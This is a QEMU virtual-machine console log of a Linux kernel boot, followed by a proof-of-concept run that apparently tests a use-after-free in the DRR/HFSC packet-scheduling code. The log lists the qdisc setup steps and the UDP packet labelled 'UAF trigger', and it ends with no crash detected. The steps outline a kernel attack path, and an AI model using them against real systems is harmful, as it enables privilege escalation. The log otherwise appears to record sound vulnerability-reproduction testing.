bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2J[    0.000000] Linux version 6.16.0-rc3-00138-g8b768bdfc83c-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #2 SMP PREEMPT_DYNAMIC Tue May  5 16:55:06 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 382069681 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000311] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000329] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000331] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.004942] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.004948] Using GB pages for direct mapping
[    0.005136] RAMDISK: [mem 0x7fe8f000-0x7ffdffff]
[    0.005140] ACPI: Early table checksum verification disabled
[    0.005143] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.005146] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.005151] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.005156] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.005159] ACPI: FACS 0x000000007FFE0000 000040
[    0.005161] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.005164] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.005166] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.005168] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.005170] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.005170] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.005171] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.005171] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.005172] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.005376] No NUMA configuration found
[    0.005377] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.005379] NODE_DATA(0) allocated [mem 0x7fe8b900-0x7fe8efff]
[    0.005387] Zone ranges:
[    0.005388]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.005389]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.005390]   Normal   empty
[    0.005391] Movable zone start for each node
[    0.005391] Early memory node ranges
[    0.005392]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.005393]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.005394] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.005839] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.005966] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.058884] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.419578] kasan: KernelAddressSanitizer initialized
[    0.419774] ACPI: PM-Timer IO Port: 0x608
[    0.419787] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.419815] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.419817] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.419819] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.419820] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.419820] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.419821] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.419824] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.419825] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.419827] TSC deadline timer available
[    0.419830] CPU topo: Max. logical packages:   1
[    0.419831] CPU topo: Max. logical dies:       1
[    0.419831] CPU topo: Max. dies per package:   1
[    0.419833] CPU topo: Max. threads per core:   1
[    0.419834] CPU topo: Num. cores per package:     2
[    0.419834] CPU topo: Num. threads per package:   2
[    0.419835] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.419853] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.419865] kvm-guest: KVM setup pv remote TLB flush
[    0.419867] kvm-guest: setup PV sched yield
[    0.419876] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.419877] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x000fffff]
[    0.419878] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.419879] Booting paravirtualized kernel on KVM
[    0.419881] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.428344] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.429388] percpu: Embedded 64 pages/cpu s221912 r8192 d32040 u1048576
[    0.429416] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.429455] random: crng init done
[    0.429456] printk: log buffer data + meta data: 262144 + 917504 = 1179648 bytes
[    0.429985] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.430585] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.430634] Fallback order for Node 0: 0 
[    0.430636] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.430637] Policy zone: DMA32
[    0.430638] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.430639] stackdepot: allocating hash table via alloc_large_system_hash
[    0.430640] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.454602] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.455726] Dynamic Preempt: voluntary
[    0.456240] rcu: Preemptible hierarchical RCU implementation.
[    0.456241] rcu: 	RCU event tracing is enabled.
[    0.456242] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.456244] 	Trampoline variant of Tasks RCU enabled.
[    0.456244] 	Tracing variant of Tasks RCU enabled.
[    0.456245] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.456246] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.456261] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.456263] RCU Tasks Trace: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.464737] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.464992] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.467312] Console: colour VGA+ 80x25
[    0.467342] printk: legacy console [ttyS0] enabled
[    0.505526] ACPI: Core revision 20250404
[    0.505876] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.506452] APIC: Switch to symmetric I/O mode setup
[    0.506843] x2apic enabled
[    0.507144] APIC: Switched APIC routing to: physical x2apic
[    0.507467] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.507869] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.508366] kvm-guest: setup PV IPIs
[    0.509216] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.509569] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.510147] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.511227] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.511634] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.511926] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.512151] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.512619] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.513145] ITS: Mitigation: Aligned branch/return thunks
[    0.513443] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.513909] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.514146] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.514611] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.515156] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.515591] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.515952] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.516145] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.516588] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.517145] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.517499] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.534630] Freeing SMP alternatives memory: 52K
[    0.534912] pid_max: default: 32768 minimum: 301
[    0.535198] LSM: initializing lsm=capability,selinux
[    0.535506] SELinux:  Initializing.
[    0.535855] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.536148] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.537247] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.538144] Performance Events: unsupported CPU family 6 model 183 no PMU driver, software events only.
[    0.538166] signal: max sigframe size: 3632
[    0.538459] rcu: Hierarchical SRCU implementation.
[    0.538734] rcu: 	Max phase no-delay instances is 400.
[    0.539172] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.541610] smp: Bringing up secondary CPUs ...
[    0.542106] smpboot: x86: Booting SMP configuration:
[    0.542147] .... node  #0, CPUs:      #1
[    0.542338] smp: Brought up 1 node, 2 CPUs
[    0.542620] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.543444] Memory: 1671296K/2096632K available (52124K kernel code, 8773K rwdata, 11440K rodata, 6124K init, 1080K bss, 418464K reserved, 0K cma-reserved)
[    0.544535] devtmpfs: initialized
[    0.546690] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.547153] posixtimers hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.547582] futex hash table entries: 512 (32768 bytes on 1 NUMA nodes, total 32 KiB, linear).
[    0.548195] PM: RTC time: 16:58:07, date: 2026-05-05
[    0.548603] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.549161] audit: initializing netlink subsys (disabled)
[    0.549498] audit: type=2000 audit(1778000287.963:1): state=initialized audit_enabled=0 res=1
[    0.549498] thermal_sys: Registered thermal governor 'step_wise'
[    0.549682] cpuidle: using governor menu
[    0.550812] PCI: Using configuration type 1 for base access
[    0.551210] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.551910] HugeTLB: allocation took 0ms with hugepage_allocation_threads=1
[    0.552150] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.552535] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.553210] ACPI: Added _OSI(Module Device)
[    0.553452] ACPI: Added _OSI(Processor Device)
[    0.553709] ACPI: Added _OSI(Processor Aggregator Device)
[    0.560243] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.562012] ACPI: Interpreter enabled
[    0.562177] ACPI: PM: (supports S0 S3 S4 S5)
[    0.562425] ACPI: Using IOAPIC for interrupt routing
[    0.562738] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.563146] PCI: Using E820 reservations for host bridge windows
[    0.563831] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.576183] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.576553] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.576993] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.577201] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.578005] PCI host bridge to bus 0000:00
[    0.578171] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.578558] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.578947] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.579147] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.579574] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.580010] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.580174] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.584928] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.589303] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.590075] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.590164] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.590551] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.590905] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.591146] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.591644] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.592295] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.592710] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.593286] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.594508] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.594919] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.595162] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.595753] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.600740] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.602443] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.602793] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.603116] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.608548] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.609415] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.610239] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.611054] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.611302] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.612956] iommu: Default domain type: Translated
[    0.613147] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.614152] SCSI subsystem initialized
[    0.614685] ACPI: bus type USB registered
[    0.615249] usbcore: registered new interface driver usbfs
[    0.615678] usbcore: registered new interface driver hub
[    0.616090] usbcore: registered new device driver usb
[    0.616225] pps_core: LinuxPPS API ver. 1 registered
[    0.616581] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.617161] PTP clock support registered
[    0.617513] Advanced Linux Sound Architecture Driver Initialized.
[    0.618733] NetLabel: Initializing
[    0.618985] NetLabel:  domain hash size = 128
[    0.619146] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.619608] NetLabel:  unlabeled traffic allowed by default
[    0.620179] PCI: Using ACPI for IRQ routing
[    0.620611] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.620611] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.621008] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.621147] vgaarb: loaded
[    0.621612] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.621951] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.625208] clocksource: Switched to clocksource kvm-clock
[    0.625988] VFS: Disk quotas dquot_6.6.0
[    0.626219] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.627051] pnp: PnP ACPI init
[    0.628448] pnp: PnP ACPI: found 6 devices
[    0.637056] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.637763] NET: Registered PF_INET protocol family
[    0.638197] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.639271] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.639901] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.640457] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.641360] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.642102] TCP: Hash tables configured (established 16384 bind 16384)
[    0.642650] UDP hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.643173] UDP-Lite hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.643830] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.644523] RPC: Registered named UNIX socket transport module.
[    0.644932] RPC: Registered udp transport module.
[    0.645284] RPC: Registered tcp transport module.
[    0.645555] RPC: Registered tcp-with-tls transport module.
[    0.645950] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.646851] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.647292] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.647737] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.648240] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.648634] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.649127] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.649464] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.649836] PCI: CLS 0 bytes, default 64
[    0.650164] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.650213] Unpacking initramfs...
[    0.650656] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.653484] Initialise system trusted keyrings
[    0.653894] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.655113] NFS: Registering the id_resolver key type
[    0.655519] Key type id_resolver registered
[    0.655786] Key type id_legacy registered
[    0.656188] 9p: Installing v9fs 9p2000 file system support
[    0.663240] Key type asymmetric registered
[    0.663582] Asymmetric key parser 'x509' registered
[    0.663986] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.664561] io scheduler mq-deadline registered
[    0.664892] io scheduler kyber registered
[    0.665343] Freeing initrd memory: 1348K
[    0.666180] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.666765] ACPI: button: Power Button [PWRF]
[    0.667578] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.668191] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.669637] Non-volatile memory driver v1.3
[    0.669891] Linux agpgart interface v0.103
[    0.670293] ACPI: bus type drm_connector registered
[    0.674463] loop: module loaded
[    0.676094] scsi host0: ata_piix
[    0.676580] scsi host1: ata_piix
[    0.676877] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.677327] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.716687] e100: Intel(R) PRO/100 Network Driver
[    0.716982] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.717347] e1000: Intel(R) PRO/1000 Network Driver
[    0.717631] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.998249] ata2: found unknown device (class 0)
[    0.998979] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.000279] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.014444] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.014848] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.022066] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    1.232262] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.516699] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.517131] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.517590] e1000e: Intel(R) PRO/1000 Network Driver
[    1.517886] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.518285] sky2: driver version 1.30
[    1.518902] usbcore: registered new interface driver usblp
[    1.519258] usbcore: registered new interface driver usb-storage
[    1.519696] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.520643] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.520944] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.521668] rtc_cmos 00:05: RTC can wake from S4
[    1.522472] rtc_cmos 00:05: registered as rtc0
[    1.522808] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.523451] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.523543] device-mapper: ioctl: 4.50.0-ioctl (2025-04-28) initialised: dm-devel@lists.linux.dev
[    1.525059] intel_pstate: CPU model not supported
[    1.525383] hid: raw HID events driver (C) Jiri Kosina
[    1.526160] usbcore: registered new interface driver usbhid
[    1.526580] usbhid: USB HID core driver
[    1.527244] netem: version 1.3
[    1.527429] u32 classifier
[    1.527589]     input device check on
[    1.527803]     Actions configured
[    1.528780] Initializing XFRM netlink socket
[    1.529105] NET: Registered PF_INET6 protocol family
[    1.529938] Segment Routing with IPv6
[    1.530217] In-situ OAM (IOAM) with IPv6
[    1.530528] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.531191] NET: Registered PF_PACKET protocol family
[    1.531563] 9pnet: Installing 9P2000 support
[    1.531852] Key type dns_resolver registered
[    1.532453] IPI shorthand broadcast: enabled
[    1.542728] sched_clock: Marking stable (1500001426, 42144041)->(1549906908, -7761441)
[    1.543464] registered taskstats version 1
[    1.543707] Loading compiled-in X.509 certificates
[    1.551448] Demotion targets for Node 0: null
[    1.551855] PM:   Magic number: 10:508:994
[    1.552154] printk: legacy console [netcon0] enabled
[    1.552455] netconsole: network logging started
[    1.552822] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.553481] kworker/u8:1 (57) used greatest stack depth: 29680 bytes left
[    1.554237] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.554696] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.555123] ALSA device list:
[    1.555834] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.557036] cfg80211: failed to load regulatory.db
[    1.557163]   No soundcards found.
[    1.560110] Freeing unused kernel image (initmem) memory: 6124K
[    1.560392] Write protecting the kernel read-only data: 65536k
[    1.561204] Freeing unused kernel image (text/rodata gap) memory: 1120K
[    1.561823] Freeing unused kernel image (rodata/data gap) memory: 848K
[    1.571918] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.572236] Run /init as init process
[    1.573562] mkdir (60) used greatest stack depth: 28888 bytes left
[    1.574295] mount (61) used greatest stack depth: 28176 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting
poc: entered user+net namespace
poc: lo up
poc: added root DRR qdisc 1:
poc: added basic filter 1: -> 1:1
poc: added DRR class 1:1
poc: added HFSC qdisc 2:
poc: added HFSC class 2:1[    1.583874] drr_dequeue: hfsc qdisc 2: is non-work-conserving?
 (rt m1=8 d=1 m2=0)
poc: added NETEM qdisc 3:
poc: added BLACKHOLE qdisc 4:
poc: sent first UDP packet (seeds[    1.584517] poc (67) used greatest stack depth: 27272 bytes left
 stale DRR active list)
poc: deleted DRR class 1:1
poc: sent second UDP packet (UAF trigger)
poc: done (no crash observed)
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    1.940729] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    2.849801] ACPI: PM: Preparing to enter system sleep state S5
[    2.850197] reboot: Power down
NO_CRASH_DETECTED
